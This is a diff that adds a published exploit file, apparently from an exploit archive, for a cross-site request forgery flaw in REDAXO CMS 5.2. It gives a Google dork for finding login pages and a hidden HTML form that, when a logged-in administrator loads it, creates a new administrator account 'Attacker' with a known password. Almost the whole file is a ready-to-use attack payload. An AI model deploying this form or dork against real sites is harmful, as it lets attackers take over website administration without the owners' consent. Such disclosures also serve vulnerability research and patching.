@@ -1,0 +1,36 @@
+# Exploit Title : redaxo CMS CSRF(Add Admin)
+# Author : Ashiyane Digital Security Team
+# Google Dork : intitle:Login · REDAXO
+# Date :  1/11/2016
+# Type : webapps
+# Platform : PHP
+# Vendor Homepage : http://www.redaxo.org/
+# Software link :http://www.redaxo.org/de/download/file/?f=redaxo_5.2.0.zip
+# Version : 5.2(latest)
+#######################################################3
+admin user : Attacker
+admin password : 123456
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+    <form name="form0" action="http://localhost/redaxo_5.2.0/redaxo/index.php?page=users/users" method="POST">
+      <input type="hidden" name="userlogin" value="Attacker" /> //  username
+      <input type="hidden" name="username" value="Attacker" />
+      <input type="hidden" name="userdesc" value="Atacker" />
+      <input type="hidden" name="useremail" value="hhhhh@hhh.com" />// email
+      <input type="hidden" name="useradmin" value="1" />
+      <input type="hidden" name="userstatus" value="1" />
+      <input type="hidden" name="userperm_be_sprache" value="en_gb" />
+      <input type="hidden" name="userpsw" value="7c4a8d09ca3762af61e59520943dc26494f8941b" /> //123456
+      <input type="hidden" name="function" value="1" />
+      <input type="hidden" name="FUNC_ADD" value="1" />
+      <input type="hidden" name="save" value="1" />
+      <input type="hidden" name="javascript" value="1" />
+      <input type="submit" name="submit_pass" value="Save" />
+    </form>
+  </body>
+</html>
+
+####################################################
+######### exploit by: Amir.ght #####################
+####################################################
